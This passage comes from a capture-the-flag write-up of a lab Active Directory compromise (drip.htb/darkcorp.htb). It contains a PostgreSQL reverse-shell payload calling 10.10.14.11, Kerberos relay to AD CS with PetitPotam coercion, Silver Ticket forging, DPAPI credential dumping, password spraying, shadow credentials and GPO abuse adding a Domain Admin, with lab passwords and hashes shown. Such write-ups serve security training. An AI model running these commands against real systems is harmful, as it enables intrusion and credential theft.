+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">ebelford@drip:/var/www$ for i in $(find . -type f \( -name '*.php' -o -name '*.xml' -o -name '*.py' -o -name '.env' \) -exec grep -li &quot;pass\|database&quot; {} + 2&gt;/dev/null | grep -v &quot;lib&quot; | grep &quot;conf\|database\|pass\|setting\|env&quot;); do echo -e $i; grep -i --color=always &quot;pass&quot; $i | grep -v &quot;\#&quot;; echo; done
+
+./html/dashboard/.env
+DB_PASS=2Qa2SsBkQvsc
+MAIL_PASSWORD = None
+
+&lt;SNIP&gt;</code></pre>
+</doc-codeblock></div>
+<p>We see a password in a <code v-pre>.env</code> files. Further inspecting it reveals the credentials of the <code v-pre>postgres_dba</code> user.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">ebelford@drip:/var/www$ cat html/dashboard/.env  | grep DB
+DB_ENGINE=postgresql
+DB_HOST=localhost
+DB_NAME=dripmail
+DB_USERNAME=dripmail_dba
+DB_PASS=2Qa2SsBkQvsc
+DB_PORT=5432</code></pre>
+</doc-codeblock></div>
+<p>We now login to Postgresql with these credentials.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">ebelford@drip:~$ PGPASSWORD=2Qa2SsBkQvsc psql -h localhost -U dripmail_dba -d dripmail
+dripmail=# COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.11 4444 &gt; /tmp/f';
+
+$ nc -nvlp 4444</code></pre>
+</doc-codeblock></div>
+<p>After executing the query, we receive a shell as the postgres user. Enumerating further, we find backups in the <code v-pre>/var/backups/postgres</code> folder of the <code v-pre>dripmail</code> database. It is encrypted with GPG, but we can try to decrypt it with the same database password.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">postgres@drip:/var/backups/postgres$ ls -la
+ls -la
+total 12
+drwx------ 2 postgres postgres 4096 Feb 16 06:08 .
+drwxr-xr-x 3 root     root     4096 Feb 16 05:36 ..
+-rw-r--r-- 1 postgres postgres 1784 Feb  5 12:52 dev-dripmail.old.sql.gpg
+
+postgres@drip:/var/backups/postgres$ gpg --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase '2Qa2SsBkQvsc' --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg &gt; /var/backups/postgres/dev-dripmail.old.sql
+
+postgres@drip:/var/backups/postgres$ cat dev-dripmail.old.sql
+&lt;SNIP&gt;
+COPY public.&quot;Admins&quot; (id, username, password, email) FROM stdin;
+1       bcase   dc5484871bc95c4eab58032884be7225        bcase@drip.htb
+2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
+3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
+&lt;SNIP&gt;</code></pre>
+</doc-codeblock></div>
+<p>We decrypted the old database and found another user (<code v-pre>victor.r</code>) with a password hash that can be cracked offline:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat -m 0 cac1c7b0e7008d67b6db40c03e76b9c0 $ROCKYOU
+cac1c7b0e7008d67b6db40c03e76b9c0:victor1gustavo@#</code></pre>
+</doc-codeblock></div>
+<p>Next we do a ping sweep on this host to find two more servers on the internal network.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">ebelford@drip:~$ for i in $(seq 254); do ping 172.16.20.${i} -c1 -W1 &amp; done | grep from
+64 bytes from 172.16.20.3: icmp_seq=1 ttl=64 time=0.049 ms
+64 bytes from 172.16.20.2: icmp_seq=1 ttl=128 time=2.07 ms
+64 bytes from 172.16.20.1: icmp_seq=1 ttl=128 time=6.35 ms</code></pre>
+</doc-codeblock></div>
+<p>We are on <code v-pre>172.16.20.3</code> and we can guess the <code v-pre>172.16.20.1</code> is the Domain Controller. We now use Ligolo-ng to pivot into the internal network.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ scp agent ebelford@drip.htb:/home/ebelford
+$ sudo ip tuntap add user $USER mode tun ligolo
+$ sudo ip link set ligolo up
+$ sudo ip route add 172.16.20.0/24 dev ligolo
+
+ebelford@drip:~$ ./agent -connect 10.10.14.11:11601 -ignore-cert
+WARN[0000] warning, certificate validation disabled
+INFO[0000] Connection established                        addr=&quot;10.10.14.11:11601&quot;
+
+$ ./proxy -selfcert -laddr 0.0.0.0:11601
+WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+
+ligolo-ng » INFO[0007] Agent joined.                                 name=ebelford@drip remote=&quot;10.10.11.54:56344&quot;
+ligolo-ng » session
+? Specify a session : 1 - #1 - ebelford@drip - 10.10.11.54:56344
+[Agent : ebelford@drip] » start
+[Agent : ebelford@drip] » INFO[0014] Starting tunnel to ebelford@drip           </code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="web-01-enumeration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#web-01-enumeration">#</doc-anchor-trigger>
+        <span>WEB-01 Enumeration</span>
+    </h2>
+</doc-anchor-target>
+<p>After our pivot we are able to reach <code v-pre>172.16.20.2</code> (add WEB-01 to <code v-pre>/etc/hosts</code>) and only two ports are open (80 and 5000). Port 80 is a default IIS page, but on port 5000 we have a Basic Auth login prompt where we can login with Victor&#x27;s credentials.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/web-01-status.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>This is a real time monitoring dashboard for various servers and databases in the network. Only WEB-01 is operational and intercepting the request with BurpSuite shows that it uses NTLM in the authorization header.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/web-01-ntlm.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="dc-01-enumeration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dc-01-enumeration">#</doc-anchor-trigger>
+        <span>DC-01 Enumeration</span>
+    </h2>
+</doc-anchor-target>
+<p>The DC has both port 80 and 443 open. When doing a quick dirsearch on port 443, it reveals that the AD CS web enrollment endpoint is reachable.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ dirsearch -u https://172.16.20.1
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Target: https://172.16.20.1/
+
+[14:33:42] Starting: 
+[14:33:54] 301 -  157B  - /aspnet_client  -&gt;  https://172.16.20.1/aspnet_client/
+[14:33:54] 403 -    1KB - /aspnet_client/
+[14:33:54] 404 -    2KB - /asset..
+[14:33:55] 403 -    1KB - /certenroll/
+[14:33:55] 401 -    1KB - /certsrv/</code></pre>
+</doc-codeblock></div>
+<p>We can check if it is vulnerable to any coercion attacks:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ nxc smb dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' -M coerce_plus
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
+COERCE_PLUS 172.16.20.1     445    DC-01            VULNERABLE, DFSCoerce
+COERCE_PLUS 172.16.20.1     445    DC-01            VULNERABLE, PetitPotam
+COERCE_PLUS 172.16.20.1     445    DC-01            VULNERABLE, MSEven</code></pre>
+</doc-codeblock></div>
+<p>The output reveals that the Domain Controller is vulnerable to PetitPotam. Also <code v-pre>WEB-01</code> shows the same result, with an additional PrinterBug vulnerability.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ nxc smb web-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' -M coerce_plus
+SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
+SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
+COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, PetitPotam
+COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, PrinterBug
+COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, MSEven</code></pre>
+</doc-codeblock></div>
+<p>The article <a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx">Relaying kerberos over SMB using krbrelayx</a> discusses a method to relay Kerberos authentication over SMB, a technique previously considered impossible. This approach leverages the CredMarshalTargetInfo function to manipulate Service Principal Names (SPNs), enabling attackers to redirect authentication requests to a malicious server. By registering a specifically crafted DNS record, an attacker can coerce a client into requesting a Kerberos ticket for a legitimate service but connecting tot the attacker&#x27;s server instead. This method an be used to relay authentication to services like ADCS, potentially allowing unauthorized access or privilege escalation within a target network.</p>
+<p>In kerberos the <code v-pre>CredMarshalTargetInfo</code> function plays a crucial role in the Kerberos authentication process. It serializes credential target information into a specific format, which is then appended to SPNs. This serialization ensures that when a client requests access to a service, the authentication system accurately identifies and processes the target service&#x27;s credentials.</p>
+<p>The idea here is to perform a Kerberos relay attack on the ADCS web enrollment endpoint. This allows us to request a certificate for the <code v-pre>WEB-01$</code> machine account (a.k.a. ESC8).</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-info"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-info" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>This is possible since LDAP signing is disabled on the domain controller.</p>
+        </div>
+    </div>
+</div>
+<p>First we need to add a marshaled DNS entry using <code v-pre>ntlmrelayx</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ sudo ntlmrelayx.py -t &quot;ldaps://172.16.20.1&quot; --no-smb-server --no-dump --no-da --no-acl --no-validate-privs --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.11
+[*] Servers started, waiting for connections
+[*] HTTPD(80): Client requested path: /
+[-] HTTPD(80): Exception in HTTP request handler: cannot access local variable 'token' where it is not associated with a value
+[*] HTTPD(80): Client requested path: /
+[*] HTTPD(80): Client requested path: /
+[*] HTTPD(80): Connection from 10.10.11.54 controlled, attacking target ldaps://172.16.20.1
+[*] HTTPD(80): Client requested path: /
+[*] HTTPD(80): Authenticating against ldaps://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
+[*] Assuming relayed user has privileges to escalate a user via ACL attack
+[*] Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` DNS record
+[*] Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` record!
+[*] Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` pointing to `10.10.14.11` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
+[*] Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. DONT FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)</code></pre>
+</doc-codeblock></div>
+<p>Next we let Victor coerce an NTLM authentication to us. We should get the response as shown above.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ curl 'http://172.16.20.2:5000/status' -X POST --json '{&quot;protocol&quot;:&quot;http&quot;,&quot;host&quot;:&quot;web-01.darkcorp.htb&quot;,&quot;port&quot;:&quot;@10.10.14.11:80&quot;}' -u 'victor.r:victor1gustavo@#' --ntlm</code></pre>
+</doc-codeblock></div>
+<p>Next we kill our <code v-pre>ntlmrelayx</code> session and start <code v-pre>krbrelayx</code> to relay the request from the <code v-pre>WEB-01$</code> machine account to us. With <code v-pre>PetitPotam</code> we provoke <code v-pre>WEB-01$</code> to reachout to our marshalled DNS host and provoke the authentication in order to relay it to the certificate server (DC-01).</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo python3 krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs -v 'WEB-01$' --interface-ip 10.10.14.11
+[*] Protocol Client SMB loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Running in attack mode to single host
+[*] Running in kerberos relay mode because no credentials were specified.
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up DNS Server
+
+[*] Servers started, waiting for connections
+[*] SMBD: Received connection from 10.10.11.54
+[*] HTTP server returned status code 200, treating as a successful login
+[*] SMBD: Received connection from 10.10.11.54
+[*] HTTP server returned status code 200, treating as a successful login
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] GOT CERTIFICATE! ID 5
+[*] Writing PKCS#12 certificate to ./WEB-01$.pfx
+[*] Certificate successfully written to file
+[*] Skipping user WEB-01$ since attack was already performed
+
+$ python PetitPotam.py -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' web-01
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:web-01[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!</code></pre>
+</doc-codeblock></div>
+<p>In the output, we see that we got a certificate <code v-pre>WEB-01$.pfx</code> back. Let&#x27;s use this certificate to get the NTLM hash of the machine account.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ gettgtpkinit.py -cert-pfx 'WEB-01$.pfx' 'darkcorp.htb/web-01$' WEB-01.ccache
+2025-02-15 19:06:46,012 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-02-15 19:06:46,269 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-02-15 19:06:46,402 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-02-15 19:06:46,402 minikerberos INFO     70973acab739bebbb5bd7c22d23bbe4e31a1e1ecc7c3ca1797e5618ae3c87d96
+INFO:minikerberos:70973acab739bebbb5bd7c22d23bbe4e31a1e1ecc7c3ca1797e5618ae3c87d96
+2025-02-15 19:06:46,405 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+
+$ KRB5CCNAME=WEB-01.ccache python ~/Tools/Python/PKINITtools/getnthash.py -key 70973acab739bebbb5bd7c22d23bbe4e31a1e1ecc7c3ca1797e5618ae3c87d96 'darkcorp.htb/WEB-01$'
+Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+8f33c7fc7ff515c1f358e488fbb8b675</code></pre>
+</doc-codeblock></div>
+<p>Now it&#x27;s time to forge a Silver Ticket. For a Silver Ticket we need several elements:</p>
+<ol>
+<li>Domain Name</li>
+<li>Domain SID</li>
+<li>Username to Impersonate</li>
+<li>Machine Account (service) FQDN and hash</li>
+</ol>
+<p>The only thing we are missing is the Domain SID, which we can get via NetExec.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc ldap dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --get-sid
+LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)
+LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@#
+LDAP        172.16.20.1     389    DC-01            Domain SID S-1-5-21-3432610366-2163336488-3604236847</code></pre>
+</doc-codeblock></div>
+<p>Now we use <code v-pre>ticketer.py</code> to forge our Silver Ticket.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ ticketer.py -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain-sid S-1-5-21-3432610366-2163336488-3604236847 -domain darkcorp.htb -spn cifs/web-01.darkcorp.htb Administrator
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for darkcorp.htb/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+
+$ KRB5CCNAME=Administrator.ccache smbclient.py -k -no-pass WEB-01.darkcorp.htb
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# use c$
+# cd Users
+# cd Administrator/Desktop
+# cat user.txt
+4427628b0503779c37ddf30baea9c23b</code></pre>
+</doc-codeblock></div>
+<p>After dumping the system credentials, we can also use WinRM to connect to WEB-01.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ secretsdump.py -hashes ':8f33c7fc7ff515c1f358e488fbb8b675' 'web-01$'@web-01.darkcorp.htb
+
+$ evil-winrm -i web-01.darkcorp.htb -u Administrator -H '88d84ec08dad123eb04a060a74053f21'</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="root">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
+        <span>Root</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="bloodhound-enumeration">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#bloodhound-enumeration">#</doc-anchor-trigger>
+        <span>BloodHound Enumeration</span>
+    </h3>
+</doc-anchor-target>
+<p>We use <a href="https://github.com/g0h4n/RustHound-CE">Rusthound</a> to get a sense of the AD environment with the credentials of victor. We can compile the release version from docker and run it.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ docker build --rm -t rusthound-ce .
+$ docker run --rm -v $PWD:/usr/src/rusthound-ce rusthound-ce release
+$ ./rusthound-ce -u victor.r@darkcorp.htb -p 'victor1gustavo@#' -c All -d darkcorp.htb --zip</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/bh-victor.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>From Bloodhound we don&#x27;t see any interesting permissions. Since we have administrator access on <code v-pre>WEB-01</code>, we can try to extract more information from the host.</p>
+<p>For this we use <code v-pre>DonPAPI</code>, a post-exploitation tool to extract and decrypt credentials stored by Windows Data Protection API (DPAPI). It helps attackers or security researchers to recover saved passwords, browser credentials, RDP sessions, and private keys from compromised Windows machines.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ donpapi collect -u Administrator -H 88d84ec08dad123eb04a060a74053f21 -t web-01.darkcorp.htb
+[web-01.darkcorp.htb] [+] Starting gathering credz
+[web-01.darkcorp.htb] [+] Dumping SAM
+[web-01.darkcorp.htb] [$] [SAM] Got 4 accounts
+[web-01.darkcorp.htb] [+] Dumping LSA
+[web-01.darkcorp.htb] [+] Dumping User and Machine masterkeys
+[web-01.darkcorp.htb] [$] [DPAPI] Got 4 masterkeys
+[web-01.darkcorp.htb] [+] Dumping User Chromium Browsers
+[web-01.darkcorp.htb] [+] Dumping User and Machine Certificates
+[web-01.darkcorp.htb] [+] Dumping User and Machine Credential Manager
+[web-01.darkcorp.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
+
+$ donpapi collect -u Administrator -p 'But_Lying_Aid9!' -t web-01.darkcorp.htb -c CredMan
+[💀] [+] DonPAPI Version 2.0.1
+[💀] [+] Output directory at /home/s3rp3nt/.donpapi
+[💀] [+] Loaded 1 targets
+[💀] [+] Recover file available at /home/s3rp3nt/.donpapi/recover/recover_1739875375
+[web-01.darkcorp.htb] [+] Starting gathering credz
+[web-01.darkcorp.htb] [+] Dumping SAM
+[web-01.darkcorp.htb] [$] [SAM] Got 4 accounts
+[web-01.darkcorp.htb] [+] Dumping LSA
+[web-01.darkcorp.htb] [+] Dumping User and Machine masterkeys
+[web-01.darkcorp.htb] [$] [DPAPI] Got 5 masterkeys
+[web-01.darkcorp.htb] [+] Dumping User and Machine Credential Manager
+[web-01.darkcorp.htb] [$] [CredMan] [Administrator] LegacyGeneric:target=WEB-01 - Administrator:Pack_Beneath_Solid9!
+[web-01.darkcorp.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!</code></pre>
+</doc-codeblock></div>
+<p>Now we can do a password spray on the domain to discover access to another user account.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb web-01.darkcorp.htb -u users.txt -p 'Pack_Beneath_Solid9!'
+SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
+SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\john.w:Pack_Beneath_Solid9!</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/bh-john-angela.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We can use this account to make shadow credentials for angela.w.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ certipy shadow auto -u 'john.w@darkcorp.htb' -p 'Pack_Beneath_Solid9!' -account angela.w
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'angela.w'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '9bcf898b-5a82-a51f-7808-b271995065c5'
+[*] Adding Key Credential with device ID '9bcf898b-5a82-a51f-7808-b271995065c5' to the Key Credentials for 'angela.w'
+[*] Successfully added Key Credential with device ID '9bcf898b-5a82-a51f-7808-b271995065c5' to the Key Credentials for 'angela.w'
+[*] Authenticating as 'angela.w' with the certificate
+[*] Using principal: angela.w@darkcorp.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'angela.w.ccache'
+[*] Trying to retrieve NT hash for 'angela.w'
+[*] Restoring the old Key Credentials for 'angela.w'
+[*] Successfully restored the old Key Credentials for 'angela.w'
+[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a</code></pre>
+</doc-codeblock></div>
+<p>After getting root on <code v-pre>web-01</code>, we can abuse the <a href="https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/">UserPrincipalName</a> to login to the linux box as admin. Essentially, in Linux it uses either the SAMAccountName or the UPN to login. When we create a ticket and specify the <code v-pre>NT_ENTERPRISE</code> it is going to use the UPN so we can bypass a unique constraint over the UPN (since the SAMAccountName is fixed).</p>
+<p>We set <code v-pre>angela.w</code>&#x27;s UPN to <code v-pre>angela.w.adm</code> using bloodyAD and solicit a new TGT of principal type <code v-pre>NT_ENTERPRISE</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD --host dc-01 -d darkcorp.htb -u john.w -p 'Pack_Beneath_Solid9!' set object 'CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb' userPrincipalName -v angela.w.adm
+[+] CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb userPrincipalName has been updated
+
+$ getTGT.py -hashes ':957246c8137069bca672dc6aa0af7c7a' -principalType NT_ENTERPRISE darkcorp.htb/angela.w.adm
+Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
+[*] Saving ticket in angela.w.adm.ccache
+
+$ scp ./angela.w.adm.ccache ebelford@drip.htb:/tmp
+
+ebelford@drip:/tmp$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
+Authenticated angela.w.adm@DARKCORP.HTB
+Account angela.w.adm: authorization for angela.w.adm@DARKCORP.HTB successful
+Changing uid to angela.w.adm (1730401107)
+angela.w.adm@drip:/tmp$ sudo su</code></pre>
+</doc-codeblock></div>
+<p>With root access we can dump cached credentials.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">root@drip:/tmp# cd /var/lib/sss/db
+root@drip:/tmp# strings cache_darkcorp.htb.ldb | grep cached -A 1
+cachedPassword
+$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
+cachedPasswordType
+lastCachedPasswordChange
+--
+cachedPassword
+$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
+cachedPasswordType
+lastCachedPasswordChange
+
+$ hashcat -m 1800 hash_taylor $ROCKYOU</code></pre>
+</doc-codeblock></div>
+<p>We then crack the password of <code v-pre>taylor.b.adm:!QAZzaq1</code>.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/bh-taylor.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Taylor is part of GPO managers and we can abuse this to get domain admin. This group has <code v-pre>WriteDACL</code> over the <code v-pre>SecurityUpdates</code> GPO.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python pygpoabuse.py 'darkcorp.htb/TAYLOR.B.ADM:!QAZzaq1' -gpo-id '652cae9a-4bb7-49f2-9e52-3361f33ce786' -command 'net group &quot;Domain Admins&quot; taylor.b.admin /add /domain' -dc-ip 172.16.20.1 -f -v
+
+INFO:root:Version updated
+[*] Version updated
+SUCCESS:root:ScheduledTask TASK_6fc934b7 created!
+[+] ScheduledTask TASK_6fc934b7 created!
+
+$ secretsdump.py darkcorp/taylor.b.adm:'!QAZzaq1'@dc-01.darkcorp.htb
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
